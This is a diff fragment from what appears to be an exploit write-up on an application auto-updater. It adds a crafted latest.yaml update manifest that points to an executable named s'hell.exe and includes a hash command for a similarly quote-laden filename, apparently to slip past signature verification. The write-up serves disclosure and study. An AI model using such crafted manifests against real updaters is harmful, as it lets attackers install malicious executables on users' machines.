@@ -237,7 +237,12 @@ shasum -a 512 "Po77'.exe" | cut -d " " -f1 | xxd -r -p | base64
 >0KAEZgATnqfm5G0YEkL1I28WvfX229sY9Imhd91kahyoKqBkxF7JTNR1tz6DzYtoGgn44zjn5lal PETNqZfZPg==
 
 3. Create the update file `latest.yaml`
-
+```yaml
+version: 1.2.3
+ files:
+   path: http:///s'hell.exe
+   sha512: yk6irOV/MlSY5BEDFR2aXg+41HTSyB0ggJBDXrcbJ0hVzaXS/.......==
+```
 ### Exploitation
 
 Step-by-step exploitation.
